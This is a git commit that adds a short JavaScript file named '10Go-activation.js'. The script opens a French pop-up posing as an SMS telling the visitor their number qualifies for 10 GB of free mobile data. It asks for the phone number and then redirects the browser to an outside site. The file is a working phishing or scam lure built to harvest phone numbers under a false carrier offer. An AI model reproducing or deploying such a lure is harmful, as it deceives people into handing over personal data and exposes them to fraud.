d1621b6195c291cdc469222772d44c0da252be98
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-19 07:06:25 +0100

    Create 10Go-activation.js

---
+++ 10Go-activation.js
@@ -0,0 +1,5 @@
+var password = 'NUMÉRO DE PORTABLE'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 10 Go, cliquez sur OK pour saisir votre numéro de mobile','NUMÉRO DE PORTABLE');
+if (password != 'NUMÉRO DE PORTABLE') {
+location.href='https://gbamz.com/10Go';
+}
